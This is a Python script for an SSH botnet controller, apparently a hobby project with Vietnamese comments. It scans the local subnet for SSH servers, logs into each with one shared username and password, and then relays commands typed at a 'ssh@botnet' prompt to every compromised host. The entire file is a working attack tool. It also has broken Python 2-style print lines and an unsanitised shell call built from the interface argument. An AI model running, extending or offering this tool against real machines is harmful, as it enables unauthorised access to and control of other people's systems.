import optparse
import os
from Botnet import botnet
from termcolor import colored
import nmap


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--username", dest="user", help="Specify common username")
    parser.add_option("-p", "--password", dest="password", help="Specify common password")
    parser.add_option("-i", "--interface", dest="interface", help="Network interface")
    (options, arguments) = parser.parse_args()
    if not options.user:
        print
        "[-] Specify common username accross ssh servers\n"
        print
        parser.print_help()
        exit()
    if not options.password:
        print
        "[-] Specify common password accross ssh servers\n"
        print
        parser.print_help()
        exit()
    if not options.interface:
        print
        "[-] Specify network interface\n"
        print
        parser.print_help()
        exit()
    return options


def getSSHserver(myip):  # Tìm những host mở port 22
    nm = nmap.PortScanner()
    print("\n[*] Scanning network for ssh servers ...")
    nm.scan(hosts=myip + '/24')
    print("[+] Scan complete\n")
    hosts = nm.all_hosts()  # Trả về 1 list các hosts tìm được trong subnet kể cả ip máy mình
    hosts.remove(myip)
    print(hosts)
    if len(hosts) == 0:
        print("[-] No live hosts that found on this network")
        exit()

    ssh_server = {}  # i là host còn j là các cổng(port)
    for i in hosts:
        openPorts = list(nm[i]['tcp'].keys())   # Return all ports have opened
        for j in openPorts:
            if nm[i]['tcp'][j]['name'] == 'ssh':    # If this port is ssh
                por = j
                ssh_server[i] = j
                break
            por = -1  # Host đó không mở port 22
    return ssh_server  # ssh_server là 1 list mỗi phần tử gồm 2 thành phần là (i, j) i và j được giải thích bên trên


def listSshServer(ssh_server):  # Ghi log những thông tin về host và port vào session.txt
    print("Running SSH Server: ")
    f2 = open('session.txt', 'a')

    for i, j in ssh_server.items():
        print(f"Host: {i}\t\tPort: {j}\n")
        f2.write(f"{i} + {j}\n")
    print("\n")
    f2.close()


def main():
    options = get_arguments()
    print("""	 _         _           _              _   
 ___ ___| |__     | |__   ___ | |_ _ __   ___| |_ 
/ __/ __| '_ \    | '_ \ / _ \| __| '_ \ / _ \ __|
\__ \__ \ | | |   | |_) | (_) | |_| | | |  __/ |_ 
|___/___/_| |_|___|_.__/ \___/ \__|_| |_|\___|\__|
             |_____|                              
""")
    interface = options.interface
    user = options.user
    password = options.password

    myip = os.popen("ifconfig " + interface + " | grep \"inet \" | awk \'{print $2}\'").read().replace("\n", "")
    ssh_servers = getSSHserver(myip)    # Find the hosts that opened port 22 and write them to session.txt
    listSshServer(ssh_servers)

    choice = input("Continue adding bots to the botnet?[Y/n] ")
    print("\n")
    if choice in ["n", "N", "no"]:
        exit()

    botnets = botnet()
    for i, j in ssh_servers.items():
        botnets.addBot(i, user, password, j)

    while True:
        strr = colored('ssh@botnet:~$ ', 'red')
        cmd = input(strr)

        if cmd == "exit()" or cmd == "exit":
            botnets.f.close()
            print("\n[*] History of commands stored in logs.txt")
            break
        else:
            botnets.sendCommandtoBot(cmd)


if __name__ == '__main__':
    main()
